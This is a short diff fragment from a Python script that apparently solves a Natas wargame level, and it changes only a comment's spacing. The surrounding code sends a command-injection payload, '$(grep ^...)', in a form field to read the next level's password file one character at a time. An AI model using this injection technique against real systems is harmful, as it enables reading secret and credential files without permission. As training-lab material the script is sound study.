@@ -34,7 +34,7 @@ while(len(seen) < 32):
         
         response = sessions.post(url,data = {"needle": "anythings$(grep ^" + "".join(seen) + ch + "  /etc/natas_webpass/natas17)"},auth = (username,password))
  
-#grep ^ - ret true if the current character is a part of the password string at the cuurent position
+# grep ^ - ret true if the current character is a part of the password string at the cuurent position
 
         content = response.text
         returned = re.findall('<pre>\n(.*)\n</pre>',content)
